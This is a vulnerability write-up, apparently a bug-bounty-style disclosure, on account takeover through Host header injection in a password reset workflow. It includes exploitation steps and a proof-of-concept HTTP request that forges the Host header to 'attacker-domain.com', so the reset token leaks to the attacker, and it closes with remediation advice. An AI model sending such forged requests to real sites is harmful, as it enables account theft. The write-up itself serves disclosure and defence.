# Account Takeover via Host Header Injection

## Description

While testing the Forgot Password functionality of a web application, a security researcher discovered that the application used the value of the `Host` header when generating password reset links.

By manipulating the Host header, it was possible to make the application generate a password reset URL pointing to an attacker-controlled domain. As a result, the password reset token could be leaked to the attacker, leading to complete account takeover.

---

## Vulnerability

### Host Header Injection

The application trusted user-supplied Host header values when constructing password reset URLs.

An attacker could modify the Host header in the forgot password request and influence the domain used inside the password reset email.

Because the reset token was embedded within the generated URL, an attacker could redirect victims to a malicious domain and capture the token.

---

## Affected Component

### Authentication System

* Forgot Password Functionality
* Password Reset Workflow

### HTTP Component

* Host Header Processing

### Impacted Data

* Password Reset Tokens
* User Accounts

---

## How It Is Exactly Exploitable

### Step 1

Attacker submits a forgot password request for the victim's account.

### Step 2

The attacker modifies the Host header.

Example:

```http
Host: attacker-domain.com:login.target.com
```

### Step 3

The application incorrectly uses this Host value when generating the password reset URL.

### Step 4

The victim receives a password reset email containing a URL that references the attacker-controlled domain.

### Step 5

When the victim clicks the password reset link, the request reaches the attacker's server.

### Step 6

The attacker captures the password reset token from the URL.

### Step 7

The attacker uses the stolen token to reset the victim's password and gains full account access.

---

## Proof of Concept (PoC)

### Normal Request

```http
POST /reset-password HTTP/1.1
Host: login.target.com

username=victim@example.com
```

### Malicious Request

```http
POST /reset-password HTTP/1.1
Host: attacker-domain.com:login.target.com

username=victim@example.com
```

### Result

Generated password reset link:

```text
https://attacker-domain.com/reset?token=ABC123XYZ
```

Victim clicks the link.

Attacker receives the request and extracts the reset token.

Using the stolen token, the attacker resets the victim's password and takes over the account.

---

## Impact

* Account Takeover
* Unauthorized Password Reset
* Credential Compromise
* Loss of User Account Integrity

---

## Root Cause

The application trusted the Host header supplied by the client instead of using a predefined trusted domain when generating password reset links.

---

## Remediation

* Never trust user-supplied Host headers.
* Use a hardcoded allowlisted domain for password reset URLs.
* Validate Host and X-Forwarded-Host headers.
* Use absolute URLs generated from trusted server-side configuration.
* Monitor password reset workflows for anomalies.

---

## Key Learning

This vulnerability demonstrates how a small misconfiguration in password reset functionality can lead to full account takeover. Any functionality that generates links based on user-controlled headers should be carefully validated and restricted to trusted domains.
